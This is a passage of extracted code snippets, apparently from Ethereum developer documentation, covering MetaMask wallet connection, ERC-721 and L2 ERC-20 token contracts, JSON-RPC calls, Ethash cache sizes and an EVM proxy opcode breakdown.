\"0x6b175474e89094c44da98b954eedeac495271d0f\"\n```\n\n----------------------------------------\n\nTITLE: Creating getCurrentWalletConnected Function for Ethereum Wallet State\nDESCRIPTION: A utility function that checks if a wallet is already connected to the application. It returns the connected address or appropriate status messages depending on the connection state.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const getCurrentWalletConnected = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_accounts\",\n      })\n      if (addressArray.length > 0) {\n        return {\n          address: addressArray[0],\n          status: \"👆🏽 Write a message in the text-field above.\",\n        }\n      } else {\n        return {\n          address: \"\",\n          status: \"🦊 Connect to MetaMask using the top right button.\",\n        }\n      }\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing connectWallet Function for MetaMask Integration in JavaScript\nDESCRIPTION: This function enables connection to the MetaMask wallet. It checks if the Ethereum provider exists in the browser, requests account access, and returns an object containing the connected address and status message.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const connectWallet = async () => {\n  if (window.ethereum) {\n    try {\n      const addressArray = await window.ethereum.request({\n        method: \"eth_requestAccounts\",\n      })\n      const obj = {\n        status: \"👆🏽 Write a message in the text-field above.\",\n        address: addressArray[0],\n      }\n      return obj\n    } catch (err) {\n      return {\n        address: \"\",\n        status: \"😥 \" + err.message,\n      }\n    }\n  } else {\n    return {\n      address: \"\",\n      status: (\n        <span>\n          <p>\n            {\" \"}\n            🦊 <a target=\"_blank\" href={`https://metamask.io/download.html`}>\n              You must install MetaMask, a virtual Ethereum wallet, in your\n              browser.\n            </a>\n          </p>\n        </span>\n      ),\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Verifying Approval Authorization in ERC-721\nDESCRIPTION: This snippet checks if the sender is authorized to approve token transfers, either by being the token owner or by having been granted operator status by the owner.\n\nLANGUAGE: vyper\nCODE:\n```\n    # Check requirements\n    senderIsOwner: bool = self.idToOwner[_tokenId] == msg.sender\n    senderIsApprovedForAll: bool = (self.ownerToOperators[owner])[msg.sender]\n    assert (senderIsOwner or senderIsApprovedForAll)\n```\n\n----------------------------------------\n\nTITLE: Implementing a Fallback Function for Custom Calldata Interpretation\nDESCRIPTION: A fallback function that processes compressed calldata format for token operations. It identifies function calls based on the first byte and extracts parameters from specified positions in the calldata.\n\nLANGUAGE: solidity\nCODE:\n```\n    fallback() external {\n        uint _func;\n\n        _func = calldataVal(0, 1);\n\n        // Call the state changing methods of token using\n        // information from the calldata\n\n        // faucet\n        if (_func == 1) {\n            token.faucet();\n            token.transfer(msg.sender,\n                token.balanceOf(address(this)));\n        }\n\n        // transfer (assume we have an allowance for it)\n        if (_func == 2) {\n            token.transferFrom(\n                msg.sender,\n                address(uint160(calldataVal(1, 20))),\n                calldataVal(21, 2)\n            );\n        }\n    }   // fallback\n\n}       // contract CalldataInterpreter\n```\n\n----------------------------------------\n\nTITLE: Configuring Etherscan API Token in Environment File\nDESCRIPTION: Example of how to add an Etherscan API key to the .env file. This token enables the application to make authenticated requests to the Etherscan API for fetching Ethereum blockchain data.\n\nLANGUAGE: sh\nCODE:\n```\n# .env Example:\nETHERSCAN_API_KEY=K6NUTARFJZJCIXHF1F1E1YGJZ8RQ29BE4U\n```\n\n----------------------------------------\n\nTITLE: Listing Cache Size Values in Bytes\nDESCRIPTION: Two arrays of integer values representing cache sizes in bytes. The first unnamed array contains 384 values starting from around 14.5GB, while the second array named 'cache_sizes' contains 384 values starting from around 16MB.\n\nLANGUAGE: text\nCODE:\n```\n14453569664, 14461959808, 14470347904, 14478737024, 14487122816,\n14495511424, 14503901824, 14512291712, 14520677504, 14529064832,\n14537456768, 14545845632, 14554234496, 14562618496, 14571011456,\n14579398784, 14587789184, 14596172672, 14604564608, 14612953984,\n14621341312, 14629724288, 14638120832, 14646503296, 14654897536,\n14663284864, 14671675264, 14680061056, 14688447616, 14696835968,\n14705228416, 14713616768, 14722003328, 14730392192, 14738784128,\n14747172736, 14755561088, 14763947648, 14772336512, 14780725376,\n14789110144, 14797499776, 14805892736, 14814276992, 14822670208,\n14831056256, 14839444352, 14847836032, 14856222848, 14864612992,\n14872997504, 14881388672, 14889775744, 14898165376, 14906553472,\n14914944896, 14923329664, 14931721856, 14940109696, 14948497024,\n14956887424, 14965276544, 14973663616, 14982053248, 14990439808,\n14998830976, 15007216768, 15015605888, 15023995264, 15032385152,\n15040768384, 15049154944, 15057549184, 15065939072, 15074328448,\n15082715008, 15091104128, 15099493504, 15107879296, 15116269184,\n15124659584, 15133042304, 15141431936, 15149824384, 15158214272,\n15166602368, 15174991232, 15183378304, 15191760512, 15200154496,\n15208542592, 15216931712, 15225323392, 15233708416, 15242098048,\n15250489216, 15258875264, 15267265408, 15275654528, 15284043136,\n15292431488, 15300819584, 15309208192, 15317596544, 15325986176,\n15334374784, 15342763648, 15351151744, 15359540608, 15367929728,\n15376318336, 15384706432, 15393092992, 15401481856, 15409869952,\n15418258816, 15426649984, 15435037568, 15443425664, 15451815296,\n15460203392, 15468589184, 15476979328, 15485369216, 15493755776,\n15502146944, 15510534272, 15518924416, 15527311232, 15535699072,\n15544089472, 15552478336, 15560866688, 15569254528, 15577642624,\n15586031488, 15594419072, 15602809472, 15611199104, 15619586432,\n15627975296, 15636364928, 15644753792, 15653141888, 15661529216,\n15669918848, 15678305152, 15686696576, 15695083136, 15703474048,\n15711861632, 15720251264, 15728636288, 15737027456, 15745417088,\n15753804928, 15762194048, 15770582656, 15778971008, 15787358336,\n15795747712, 15804132224, 15812523392, 15820909696, 15829300096,\n15837691264, 15846071936, 15854466944, 15862855808, 15871244672,\n15879634816, 15888020608, 15896409728, 15904799104, 15913185152,\n15921577088, 15929966464, 15938354816, 15946743424, 15955129472,\n15963519872, 15971907968, 15980296064, 15988684928, 15997073024,\n16005460864, 16013851264, 16022241152, 16030629248, 16039012736,\n16047406976, 16055794816, 16064181376, 16072571264, 16080957824,\n16089346688, 16097737856, 16106125184, 16114514816, 16122904192,\n16131292544, 16139678848, 16148066944, 16156453504, 16164839552,\n16173236096, 16181623424, 16190012032, 16198401152, 16206790528,\n16215177344, 16223567744, 16231956352, 16240344704, 16248731008,\n16257117824, 16265504384, 16273898624, 16282281856, 16290668672,\n16299064192, 16307449216, 16315842176, 16324230016, 16332613504,\n16341006464, 16349394304, 16357783168, 16366172288, 16374561664,\n16382951296, 16391337856, 16399726208, 16408116352, 16416505472,\n16424892032, 16433282176, 16441668224, 16450058624, 16458448768,\n16466836864, 16475224448, 16483613056, 16492001408, 16500391808,\n16508779648, 16517166976, 16525555328, 16533944192, 16542330752,\n16550719616, 16559110528, 16567497088, 16575888512, 16584274816,\n16592665472, 16601051008, 16609442944, 16617832064, 16626218624,\n16634607488, 16642996096, 16651385728, 16659773824, 16668163712,\n16676552576, 16684938112, 16693328768, 16701718144, 16710095488,\n16718492288, 16726883968, 16735272832, 16743661184, 16752049792,\n16760436608, 16768827008, 16777214336, 16785599104, 16793992832,\n16802381696, 16810768768, 16819151744, 16827542656, 16835934848,\n16844323712, 16852711552, 16861101952, 16869489536, 16877876864,\n16886265728, 16894653056, 16903044736, 16911431296, 16919821696,\n16928207488, 16936592768, 16944987776, 16953375616, 16961763968,\n16970152832, 16978540928, 16986929536, 16995319168, 17003704448,\n17012096896, 17020481152, 17028870784, 17037262208, 17045649536,\n17054039936, 17062426496, 17070814336, 17079205504, 17087592064,\n17095978112, 17104369024, 17112759424, 17121147776, 17129536384,\n17137926016, 17146314368, 17154700928, 17163089792, 17171480192,\n17179864192, 17188256896, 17196644992, 17205033856, 17213423488,\n17221811072, 17230198912, 17238588032, 17246976896, 17255360384,\n17263754624, 17272143232, 17280530048, 17288918912, 17297309312,\n17305696384, 17314085504, 17322475136, 17330863744, 17339252096,\n17347640192, 17356026496, 17364413824, 17372796544, 17381190016,\n17389583488, 17397972608, 17406360704, 17414748544, 17423135872,\n17431527296, 17439915904, 17448303232, 17456691584, 17465081728,\n17473468288, 17481857408, 17490247552, 17498635904, 17507022464,\n17515409024, 17523801728, 17532189824, 17540577664, 17548966016,\n17557353344, 17565741184, 17574131584, 17582519168, 17590907008,\n17599296128, 17607687808, 17616076672, 17624455808, 17632852352,\n17641238656, 17649630848, 17658018944, 17666403968, 17674794112,\n17683178368, 17691573376, 17699962496, 17708350592, 17716739968,\n17725126528, 17733517184, 17741898112, 17750293888, 17758673024,\n17767070336, 17775458432, 17783848832, 17792236928, 17800625536,\n17809012352, 17817402752, 17825785984, 17834178944, 17842563968,\n17850955648, 17859344512, 17867732864, 17876119424, 17884511872,\n17892900224, 17901287296, 17909677696, 17918058112, 17926451072,\n17934843776, 17943230848, 17951609216, 17960008576, 17968397696,\n17976784256, 17985175424, 17993564032, 18001952128, 18010339712,\n18018728576, 18027116672, 18035503232, 18043894144, 18052283264,\n18060672128, 18069056384, 18077449856, 18085837184, 18094225792,\n18102613376, 18111004544, 18119388544, 18127781248, 18136170368,\n18144558976, 18152947328, 18161336192, 18169724288, 18178108544,\n18186498944, 18194886784, 18203275648, 18211666048, 18220048768,\n18228444544, 18236833408, 18245220736\n```\n\nLANGUAGE: text\nCODE:\n```\ncache_sizes = [\n16776896, 16907456, 17039296, 17170112, 17301056, 17432512, 17563072,\n17693888, 17824192, 17955904, 18087488, 18218176, 18349504, 18481088,\n18611392, 18742336, 18874304, 19004224, 19135936, 19267264, 19398208,\n19529408, 19660096, 19791424, 19922752, 20053952, 20184896, 20315968,\n20446912, 20576576, 20709184, 20840384, 20971072, 21102272, 21233216,\n21364544, 21494848, 21626816, 21757376, 21887552, 22019392, 22151104,\n22281536, 22412224, 22543936, 22675264, 22806464, 22935872, 23068096,\n23198272, 23330752, 23459008, 23592512, 23723968, 23854912, 23986112,\n24116672, 24247616, 24378688, 24509504, 24640832, 24772544, 24903488,\n25034432, 25165376, 25296704, 25427392, 25558592, 25690048, 25820096,\n25951936, 26081728, 26214208, 26345024, 26476096, 26606656, 26737472,\n26869184, 26998208, 27131584, 27262528, 27393728, 27523904, 27655744,\n27786688, 27917888, 28049344, 28179904, 28311488, 28441792, 28573504,\n28700864, 28835648, 28966208, 29096768, 29228608, 29359808, 29490752,\n29621824, 29752256, 29882816, 30014912, 30144448, 30273728, 30406976,\n30538432, 30670784, 30799936, 30932672, 31063744, 31195072, 31325248,\n31456192, 31588288, 31719232, 31850432, 31981504, 32110784, 32243392,\n32372672, 32505664, 32636608, 32767808, 32897344, 33029824, 33160768,\n33289664, 33423296, 33554368, 33683648, 33816512, 33947456, 34076992,\n34208704, 34340032, 34471744, 34600256, 34734016, 34864576, 34993984,\n35127104, 35258176, 35386688, 35518528, 35650624, 35782336, 35910976,\n36044608, 36175808, 36305728, 36436672, 36568384, 36699968, 36830656,\n36961984, 37093312, 37223488, 37355072, 37486528, 37617472, 37747904,\n37879232, 38009792, 38141888, 38272448, 38403392, 38535104, 38660672,\n38795584, 38925632, 39059264, 39190336, 39320768, 39452096, 39581632,\n39713984, 39844928, 39974848, 40107968, 40238144, 40367168, 40500032,\n40631744, 40762816, 40894144, 41023552, 41155904, 41286208, 41418304,\n41547712, 41680448, 41811904, 41942848, 42073792, 42204992, 42334912,\n42467008, 42597824, 42729152, 42860096, 42991552, 43122368, 43253696,\n43382848, 43515712, 43646912, 43777088, 43907648, 44039104, 44170432,\n44302144, 44433344, 44564288, 44694976, 44825152, 44956864, 45088448,\n45219008, 45350464, 45481024, 45612608, 45744064, 45874496, 46006208,\n46136768, 46267712, 46399424, 46529344, 46660672, 46791488, 46923328,\n47053504, 47185856, 47316928, 47447872, 47579072, 47710144, 47839936,\n47971648, 48103232, 48234176, 48365248, 48496192, 48627136, 48757312,\n48889664, 49020736, 49149248, 49283008, 49413824, 49545152, 49675712,\n49807168, 49938368, 50069056, 50200256, 50331584, 50462656, 50593472,\n50724032, 50853952, 50986048, 51117632, 51248576, 51379904, 51510848,\n51641792, 51773248, 51903296, 52035136, 52164032, 52297664, 52427968,\n52557376, 52690112, 52821952, 52952896, 53081536, 53213504, 53344576,\n53475776, 53608384, 53738816, 53870528, 54000832, 54131776, 54263744,\n54394688, 54525248, 54655936, 54787904, 54918592, 55049152, 55181248,\n55312064, 55442752, 55574336, 55705024, 55836224, 55967168, 56097856,\n56228672, 56358592, 56490176, 56621888, 56753728, 56884928, 57015488,\n57146816, 57278272, 57409216, 57540416, 57671104, 57802432, 57933632,\n58064576, 58195264, 58326976, 58457408, 58588864, 58720192, 58849984,\n58981696, 59113024, 59243456, 59375552, 59506624, 59637568, 59768512,\n59897792, 60030016, 60161984, 60293056, 60423872, 60554432, 60683968,\n60817216, 60948032, 61079488, 61209664, 61341376, 61471936, 61602752,\n61733696, 61865792, 61996736, 62127808, 62259136, 62389568, 62520512,\n62651584, 62781632, 62910784, 63045056, 63176128, 63307072, 63438656,\n63569216, 63700928, 63831616, 63960896, 64093888, 64225088, 64355392,\n64486976, 64617664, 64748608, 64879424, 65009216, 65142464, 65273792,\n65402816, 65535424, 65666752, 65797696, 65927744, 66060224, 66191296,\n66321344, 66453056, 66584384, 66715328, 66846656, 66977728, 67108672,\n67239104, 67370432, 67501888, 67631296, 67763776, 67895104, 68026304,\n68157248, 68287936, 68419264, 68548288, 68681408, 68811968, 68942912,\n69074624, 69205568, 69337024, 69467584, 69599168, 69729472, 69861184,\n```\n\n----------------------------------------\n\nTITLE: Adding Global Constraints in Manticore Analysis\nDESCRIPTION: Example of adding global constraints to limit the symbolic execution space in Manticore. This constrains a symbolic address to only certain values before executing a transaction.\n\nLANGUAGE: python\nCODE:\n```\nsymbolic_address = m.make_symbolic_value()\nm.constraint(Operators.OR(symbolic == 0x41, symbolic_address == 0x42))\nm.transaction(caller=user_account,\n              address=contract_account,\n              data=m.make_symbolic_buffer(320),\n              value=0)\n```\n\n----------------------------------------\n\nTITLE: Updating React useEffect Hook with Wallet Connection\nDESCRIPTION: This code updates the React useEffect hook to call the getCurrentWalletConnected function to check the current wallet status and then adds the wallet listener to detect future changes.\n\nLANGUAGE: javascript\nCODE:\n```\nuseEffect(async () => {\n  const { address, status } = await getCurrentWalletConnected()\n  setWallet(address)\n  setStatus(status)\n\n  addWalletListener()\n}, [])\n```\n\n----------------------------------------\n\nTITLE: CALL Operation Memory Effect in Ethereum VM\nDESCRIPTION: The CALL opcode (0xF1) performs a message call. This snippet shows how return data is copied to memory at the specified location.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] := returndata\n```\n\n----------------------------------------\n\nTITLE: Implementing a Token System in Serpent on Ethereum\nDESCRIPTION: Basic code implementation of a token system in Serpent language for Ethereum. This function transfers tokens from one address to another after verifying the sender has sufficient balance. It represents the fundamental operation of any cryptocurrency or token system.\n\nLANGUAGE: python\nCODE:\n```\ndef send(to, value):\n  if self.storage[msg.sender] >= value:\n    self.storage[msg.sender] = self.storage[msg.sender] - value\n    self.storage[to] = self.storage[to] + value\n```\n\n----------------------------------------\n\nTITLE: Checking Maximum Redemption Limit in ERC-4626 Vaults in Solidity\nDESCRIPTION: This function returns the maximum amount of shares that can be redeemed from the owner's balance in a single redeem call.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction maxRedeem(address owner) public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Retrieving Client Coinbase Address with eth_coinbase\nDESCRIPTION: This method returns the client coinbase address (20 bytes). Note that this method has been deprecated as of v1.14.0 and is no longer supported.\n\nLANGUAGE: js\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_coinbase\",\"params\":[],\"id\":64}'\n// Result\n{\n  \"id\":64,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x407d73d8a49eeb85d32cf465507dd71d507100c1\"\n}\n```\n\n----------------------------------------\n\nTITLE: Installation des dépendances TypeScript et de test\nDESCRIPTION: Commandes pour installer les dépendances TypeScript, Mocha et Chai nécessaires pour les tests.\n\nLANGUAGE: bash\nCODE:\n```\nyarn add --dev @types/chai @types/mocha chai mocha ts-node typescript\n# or if you're using npm\nnpm install @types/chai @types/mocha chai mocha ts-node typescript --save-dev\n```\n\n----------------------------------------\n\nTITLE: Installing Alchemy Web3 and dotenv Dependencies\nDESCRIPTION: Terminal commands to install the Alchemy Web3 library and dotenv package for secure API key storage in an Ethereum dApp project.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @alch/alchemy-web3\nnpm install dotenv --save\n```\n\n----------------------------------------\n\nTITLE: Defining L2StandardERC20 Contract with Additional Storage Variables\nDESCRIPTION: Declares the L2StandardERC20 contract which implements IL2StandardERC20 and extends ERC20, adding storage variables for L1 token address and L2 bridge address.\n\nLANGUAGE: solidity\nCODE:\n```\nimport \"./IL2StandardERC20.sol\";\n\ncontract L2StandardERC20 is IL2StandardERC20, ERC20 {\n    address public l1Token;\n    address public l2Bridge;\n```\n\n----------------------------------------\n\nTITLE: Consultando Saldo de Conta Ethereum com Web3.py\nDESCRIPTION: Obtém o saldo de uma conta Ethereum específica em wei, que é a menor denominação de ether.\n\nLANGUAGE: python\nCODE:\n```\nw3.eth.get_balance(w3.eth.accounts[0])\n```\n\n----------------------------------------\n\nTITLE: Gaz Ücretini Dengeleme Formülü\nDESCRIPTION: Günlük ETH emisyonunu dengelemek için gereken ortalama gaz ücretini (gwei cinsinden) hesaplama formülü. Günlük blok sayısı, blok başına gaz miktarı ve günlük ETH dağıtımı değerlerini kullanır.\n\nLANGUAGE: markdown\nCODE:\n```\n- `7200 blok/gün * 15x10^6 gaz/blok *`**`Y gwei/gaz`**`* 1 ETH/ 10^9 gwei = 1700 ETH/gün`\n```\n\n----------------------------------------\n\nTITLE: SHL Opcode (Shift Left) in EVM\nDESCRIPTION: The SHL opcode performs a left shift operation. It takes a shift amount and a value from the stack, and returns the result of shifting the value left by the specified number of bits.\n\nLANGUAGE: evm-assembly\nCODE:\n```\nval << shift\n```\n\n----------------------------------------\n\nTITLE: Validating Token Approvals in Solidity\nDESCRIPTION: Implements the _isApprovedOrOwner internal function that checks if an address is authorized to transfer a specific token by verifying if it's the owner or has specific/operator approval.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _isApprovedOrOwner(address spender, uint256 pizzaId)\n    internal\n    view\n    returns (bool)\n{\n    address owner = pizzaToOwner[pizzaId];\n    // Disable solium check because of\n    // https://github.com/duaraghav8/Solium/issues/175\n    // solium-disable-next-line operator-whitespace\n    return (spender == owner ||\n        this.getApproved(pizzaId) == spender ||\n        this.isApprovedForAll(owner, spender));\n}\n```\n\n----------------------------------------\n\nTITLE: Reading Data from Smart Contract\nDESCRIPTION: Async function that retrieves the current message stored in the smart contract and logs it to the console.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// ...\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n}\nmain()\n```\n\n----------------------------------------\n\nTITLE: Überprüfen des Ethereum-Kontostands mit JSON-RPC\nDESCRIPTION: JSON-RPC Antwort eines eth_getBalance Aufrufs, der den ETH-Kontostand in Wei zurückgibt. Der Wert 0x2B5E3AF16B1880000 entspricht 5 ETH in Dezimalzahl.\n\nLANGUAGE: json\nCODE:\n```\n{ \"jsonrpc\": \"2.0\", \"id\": 0, \"result\": \"0x2B5E3AF16B1880000\" }\n```\n\n----------------------------------------\n\nTITLE: Installing Alchemy Web3 in New Project\nDESCRIPTION: Command to install the Alchemy Web3 dependency in a new project. This is necessary to interact with the Ethereum blockchain through Alchemy's infrastructure.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @alch/alchemy-web3\n```\n\n----------------------------------------\n\nTITLE: Implementing Fallback Functions for Proxy Patterns in Solidity\nDESCRIPTION: Explains how fallback functions are used in proxy contracts to handle function calls and delegate them to implementation contracts. When a user calls a function not directly defined in the proxy, the fallback function executes and forwards the call.\n\nLANGUAGE: solidity\nCODE:\n```\nFallback\n```\n\n----------------------------------------\n\nTITLE: Generalized Formula for Deflation Gas Price\nDESCRIPTION: A generalized formula that expresses the required gas price as a function of daily ETH issuance (X), allowing calculation for any issuance amount. This formula simplifies to X/108.\n\nLANGUAGE: math\nCODE:\n```\nY = (X(10^3)/(7200 * 15)) = X/108\nf(X) = X/108\n```\n\n----------------------------------------\n\nTITLE: Importing IPFS Upload Function in JavaScript NFT Minter\nDESCRIPTION: Imports the pinJSONToIPFS function from the pinata.js file to enable metadata uploading to IPFS in the NFT minting workflow.\n\nLANGUAGE: javascript\nCODE:\n```\nimport { pinJSONToIPFS } from \"./pinata.js\"\n```\n\n----------------------------------------\n\nTITLE: Running Interaction Script on Goerli Network\nDESCRIPTION: Command to run the interaction script specifically on the Goerli testnet, which will read and update the contract state.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat run scripts/interact.js --network goerli\n```\n\n----------------------------------------\n\nTITLE: Implementing L2 Standard ERC-20 for Optimism Bridge\nDESCRIPTION: Implementation of the IL2StandardERC20 interface that extends OpenZeppelin's ERC20. This contract allows only the L2 bridge to mint and burn tokens, ensuring proper asset balance between L1 and L2.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\nimport { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"./IL2StandardERC20.sol\";\n\ncontract L2StandardERC20 is IL2StandardERC20, ERC20 {\n    address public l1Token;\n    address public l2Bridge;\n\n    /**\n     * @param _l2Bridge Address of the L2 standard bridge.\n     * @param _l1Token Address of the corresponding L1 token.\n     * @param _name ERC20 name.\n     * @param _symbol ERC20 symbol.\n     */\n    constructor(\n        address _l2Bridge,\n        address _l1Token,\n        string memory _name,\n        string memory _symbol\n    ) ERC20(_name, _symbol) {\n        l1Token = _l1Token;\n        l2Bridge = _l2Bridge;\n    }\n\n    modifier onlyL2Bridge() {\n        require(msg.sender == l2Bridge, \"Only L2 Bridge can mint and burn\");\n        _;\n    }\n\n\n    // slither-disable-next-line external-function\n    function supportsInterface(bytes4 _interfaceId) public pure returns (bool) {\n        bytes4 firstSupportedInterface = bytes4(keccak256(\"supportsInterface(bytes4)\")); // ERC165\n        bytes4 secondSupportedInterface = IL2StandardERC20.l1Token.selector ^\n            IL2StandardERC20.mint.selector ^\n            IL2StandardERC20.burn.selector;\n        return _interfaceId == firstSupportedInterface || _interfaceId == secondSupportedInterface;\n    }\n\n    // slither-disable-next-line external-function\n    function mint(address _to, uint256 _amount) public virtual onlyL2Bridge {\n        _mint(_to, _amount);\n\n        emit Mint(_to, _amount);\n    }\n\n    // slither-disable-next-line external-function\n    function burn(address _from, uint256 _amount) public virtual onlyL2Bridge {\n        _burn(_from, _amount);\n\n        emit Burn(_from, _amount);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Ensuring Token Uniqueness with Solidity Modifier\nDESCRIPTION: Implements the isUnique modifier that ensures a pizza token with the same name and DNA doesn't already exist. It iterates through all existing pizzas and compares their names and DNA values.\n\nLANGUAGE: Solidity\nCODE:\n```\nmodifier isUnique(string memory _name, uint256 _dna) {\n    bool result = true;\n    for (uint256 i = 0; i < pizzas.length; i++) {\n        if (\n            keccak256(abi.encodePacked(pizzas[i].name)) ==\n            keccak256(abi.encodePacked(_name)) &&\n            pizzas[i].dna == _dna\n        ) {\n            result = false;\n        }\n    }\n    require(result, \"Pizza with such name already exists.\");\n    _;\n}\n```\n\n----------------------------------------\n\nTITLE: Implémentation d'un Mécanisme d'Arrêt d'Urgence en Solidity\nDESCRIPTION: Ce code illustre l'implémentation d'un modèle d'arrêt d'urgence pour les contrats intelligents. Il comprend une variable booléenne qui détermine l'état du contrat, des modificateurs pour contrôler l'accès aux fonctions en fonction de l'état, et des fonctions permettant d'arrêter et de reprendre le contrat en cas d'urgence.\n\nLANGUAGE: solidity\nCODE:\n```\n// Ce code n'a pas fait l'objet d'un audit professionnel et ne fait aucune promesse quant à sa sécurité ou son exactitude. Utilisez-le à vos risques et périls.\n\ncontract EmergencyStop {\n\n    bool isStopped = false;\n\n    modifier stoppedInEmergency {\n        require(!isStopped);\n        _;\n    }\n\n    modifier onlyWhenStopped {\n        require(isStopped);\n        _;\n    }\n\n    modifier onlyAuthorized {\n        // Check for authorization of msg.sender here\n        _;\n    }\n\n    function stopContract() public onlyAuthorized {\n        isStopped = true;\n    }\n\n    function resumeContract() public onlyAuthorized {\n        isStopped = false;\n    }\n\n    function deposit() public payable stoppedInEmergency {\n        // Deposit logic happening here\n    }\n\n    function emergencyWithdraw() public onlyWhenStopped {\n        // Emergency withdraw happening here\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing mint Function in Vyper ERC-721\nDESCRIPTION: This function allows the contract minter to create new tokens. It includes checks to ensure only the minter can call it, the recipient is not the zero address, and the token ID is not already in use.\n\nLANGUAGE: vyper\nCODE:\n```\n@external\ndef mint(_to: address, _tokenId: uint256) -> bool:\n    \"\"\"\n    @dev Function to mint tokens\n         Throws if `msg.sender` is not the minter.\n         Throws if `_to` is zero address.\n         Throws if `_tokenId` is owned by someone.\n    @param _to The address that will receive the minted tokens.\n    @param _tokenId The token id to mint.\n    @return A boolean that indicates if the operation was successful.\n    \"\"\"\n    # Throws if `msg.sender` is not the minter\n    assert msg.sender == self.minter\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies for Ethereum Development with Python\nDESCRIPTION: Terminal commands for installing IPython for an interactive development environment and web3.py library for Ethereum interaction, including the tester package for blockchain simulation.\n\nLANGUAGE: bash\nCODE:\n```\npip install ipython\n```\n\nLANGUAGE: bash\nCODE:\n```\npip install web3\n```\n\nLANGUAGE: bash\nCODE:\n```\npip install 'web3[tester]'\n```\n\n----------------------------------------\n\nTITLE: L2 Bridge Deposit Finalization Function in Solidity\nDESCRIPTION: Function signature for finalizing deposits from L1. This is called via a cross-domain message from the L1 bridge when tokens are deposited on L1.\n\nLANGUAGE: solidity\nCODE:\n```\n    /************************************\n     * Cross-chain Function: Depositing *\n     ************************************/\n\n    /**\n     * @inheritdoc IL2ERC20Bridge\n     */\n    function finalizeDeposit(\n        address _l1Token,\n        address _l2Token,\n        address _from,\n        address _to,\n        uint256 _amount,\n        bytes calldata _data\n```\n\n----------------------------------------\n\nTITLE: Defining Swap Event in Uniswap\nDESCRIPTION: Event emitted when a trader exchanges one token for another. It tracks the sender, recipient, and the amounts of tokens flowing in and out of the exchange.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Swap(\n    address indexed sender,\n    uint amount0In,\n    uint amount1In,\n    uint amount0Out,\n    uint amount1Out,\n    address indexed to\n);\n```\n\n----------------------------------------\n\nTITLE: Analyzing EVM Proxy Contract Opcodes at 0x7C\nDESCRIPTION: Detailed breakdown of EVM opcodes for a proxy contract that uses DELEGATECALL to forward execution to another contract stored at Storage[3]. The code copies calldata to memory, executes the delegated call, then handles the return data appropriately based on success or failure.\n\nLANGUAGE: evm\nCODE:\n```\n7C | JUMPDEST           |                      \n7D | PUSH1 0x00         | 0x00                 \n7F | PUSH2 0x009d       | 0x9D 0x00            \n82 | PUSH1 0x03         | 0x03 0x9D 0x00       \n84 | SLOAD              | Storage[3] 0x9D 0x00 \n```\n\nLANGUAGE: evm\nCODE:\n```\n85 | PUSH20 0xffffffffffffffffffffffffffffffffffffffff | 0xff....ff Storage[3] 0x9D 0x00 \n9A | AND                                               | Storage[3]-as-address 0x9D 0x00 \n```\n\nLANGUAGE: evm\nCODE:\n```\n9B | SWAP1              | 0x9D Storage[3]-as-address 0x00 \n9C | JUMP               | Storage[3]-as-address 0x00      \n```\n\nLANGUAGE: evm\nCODE:\n```\n9D | JUMPDEST           | Storage[3]-as-address 0x00      \n9E | SWAP1              | 0x00 Storage[3]-as-address      \n9F | POP                | Storage[3]-as-address           \nA0 | PUSH1 0x40         | 0x40 Storage[3]-as-address      \nA2 | MLOAD              | Mem[0x40] Storage[3]-as-address \n```\n\nLANGUAGE: evm\nCODE:\n```\nA3 | CALLDATASIZE       | CALLDATASIZE 0x80 Storage[3]-as-address           \nA4 | PUSH1 0x00         | 0x00 CALLDATASIZE 0x80 Storage[3]-as-address      \nA6 | DUP3               | 0x80 0x00 CALLDATASIZE 0x80 Storage[3]-as-address \nA7 | CALLDATACOPY       | 0x80 Storage[3]-as-address                        \n```\n\nLANGUAGE: evm\nCODE:\n```\nA8 | PUSH1 0x00         | 0x00 0x80 Storage[3]-as-address                                                  \nAA | DUP1               | 0x00 0x00 0x80 Storage[3]-as-address                                             \nAB | CALLDATASIZE       | CALLDATASIZE 0x00 0x00 0x80 Storage[3]-as-address                                \nAC | DUP4               | 0x80 CALLDATASIZE 0x00 0x00 0x80 Storage[3]-as-address                           \nAD | DUP6               | Storage[3]-as-address 0x80 CALLDATASIZE 0x00 0x00 0x80 Storage[3]-as-address     \nAE | GAS                | GAS Storage[3]-as-address 0x80 CALLDATASIZE 0x00 0x00 0x80 Storage[3]-as-address \nAF | DELEGATE_CALL      |                                                                                  \n```\n\nLANGUAGE: evm\nCODE:\n```\nB0 | RETURNDATASIZE     | RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address                          \nB1 | DUP1               | RETURNDATASIZE RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address           \nB2 | PUSH1 0x00         | 0x00 RETURNDATASIZE RETURNDATASIZE (((call success/failure))) 0x80 Storage[3]-as-address      \nB4 | DUP5               | 0x80 0x00 RETURNDATASIZE RETURNDATASIZE (((call 